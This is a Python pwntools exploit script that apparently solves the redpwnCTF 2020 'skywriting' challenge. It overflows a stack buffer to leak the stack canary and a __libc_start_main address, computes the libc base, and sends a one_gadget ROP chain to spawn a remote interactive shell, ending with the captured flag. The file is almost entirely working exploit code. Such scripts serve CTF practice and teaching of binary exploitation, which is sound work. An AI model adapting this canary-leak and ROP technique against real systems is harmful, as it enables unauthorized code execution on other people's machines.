#! /usr/bin/python3

from pwn import *

ip = '2020.redpwnc.tf'
port = 31034
binary = './skywriting'

elf = context.binary = ELF(binary)
libc = ELF('./libc.so.6')  # glibc-2.27 (Ubuntu 18.04 default libc, based on provided Dockerfile)

libc.symbols['one_gadget'] = 0x4f322

canary_padding = 136

libc_start_main_231_padding = canary_padding + 15
rip_padding = canary_padding + 8 + 8

trigger_ret = 'notflag{a_cloud_is_just_someone_elses_computer}\n\x00'

splash()

io = remote(ip,port)

with log.progress('Stage 1: Leak canary'):
    io.recvuntil('Hello there, do you want to write on the sky? \n')
    io.sendline('1')

    io.recvuntil('Is the answer intuitive yet? Give it your best shot: ')

    payload = flat(length = canary_padding)
    io.sendline(payload)

    io.recvline()
    canary = u64(b'\x00' + io.recv(7)) # Fix width for canary

    io.success('Leaked canary=>'+hex(canary))

with log.progress('Stage 2: Leak (__libc_start_main + 231)'):
    io.recvuntil('Try again, give it another shot: ')

    payload = flat(length = libc_start_main_231_padding)
    io.sendline(payload)

    io.recvline()
    libc_start_main_231 = u64(io.recv(6) + b'\x00\x00') # Fix width for __libc_start_main + 231
    io.success('Leaked (__libc_start_main + 231)=>'+hex(libc_start_main_231))

    libc.address = libc_start_main_231 - (libc.symbols['__libc_start_main'] + 231)
    io.success('Calculated libc base=>' +hex(libc.address))

with log.progress('Stage 3: Pwn'):
    rop = ROP([elf, libc])
    rop.one_gadget()

    io.recvuntil('Try again, give it another shot: ')
    io.sendline(flat({ 0: trigger_ret, canary_padding: p64(canary), rip_padding: rop.chain() }))

    io.interactive()

io.close()
#flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}